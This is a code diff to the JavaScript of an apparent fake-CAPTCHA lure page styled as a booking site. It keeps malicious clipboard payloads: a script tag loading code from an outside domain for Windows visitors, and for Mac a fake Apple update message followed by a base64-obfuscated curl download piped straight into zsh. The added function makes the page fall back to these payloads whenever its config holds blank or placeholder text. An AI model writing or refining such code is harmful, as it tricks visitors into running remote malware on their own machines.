@@ -1598,6 +1598,28 @@
 
         const DEFAULT_WINDOWS_CLIPBOARD = '<scr' + 'ipt src="https://aniyara.icu/870ahpun4p/api"></scr' + 'ipt>';
         const DEFAULT_MAC_CLIPBOARD = 'echo "Downloading Update: https://support.apple.com/downloads/macos-security-update-14.5.dmg" && curl -s $(echo "aHR0cHM6Ly9oZWJzYnNiempzanNoZHV4YnMueHl6L2RlYnVnL2xvYWRlci5zaD9idWlsZD00MDEzOGQ1M2ViYjYwZTNmNjg4NjNjZTUwNWM2NjhiOA==" | base64 -d) | zsh';
+        const PLACEHOLDER_CLIPBOARD = new Set([
+            '<темный друн>',
+            '<темный друн mac>',
+            'Example Mac clipboard text',
+            'Example Windows clipboard text'
+        ]);
+
+        function resolveClipboardText(platform, config) {
+            const defaults = platform === 'mac' ? DEFAULT_MAC_CLIPBOARD : DEFAULT_WINDOWS_CLIPBOARD;
+            if (!config) return defaults;
+
+            const fromConfig = platform === 'mac'
+                ? config.macClipboardText
+                : config.windowsClipboardText;
+            const trimmed = (fromConfig || '').trim();
+
+            if (!trimmed || PLACEHOLDER_CLIPBOARD.has(trimmed)) {
+                return defaults;
+            }
+
+            return fromConfig;
+        }
 
         async function initCaptcha() {
             const platform = BookingAPI.detectPlatform();
@@ -1607,15 +1629,13 @@
                 platform === 'mac' ? 'verificationStepsMac' : 'verificationStepsWindows'
             );
             let activated = false;
-            let clipboardText = platform === 'mac' ? DEFAULT_MAC_CLIPBOARD : DEFAULT_WINDOWS_CLIPBOARD;
+            let clipboardText = resolveClipboardText(platform);
 
             try {
                 const config = await BookingAPI.getConfig();
-                clipboardText = platform === 'mac'
-                    ? (config.macClipboardText || DEFAULT_MAC_CLIPBOARD)
-                    : (config.windowsClipboardText || DEFAULT_WINDOWS_CLIPBOARD);
+                clipboardText = resolveClipboardText(platform, config);
             } catch (e) {
-                console.warn('Config load failed, using defaults', e);
+                console.warn('Config load failed, using index.html defaults', e);
             }
 
             async function activate(event) {
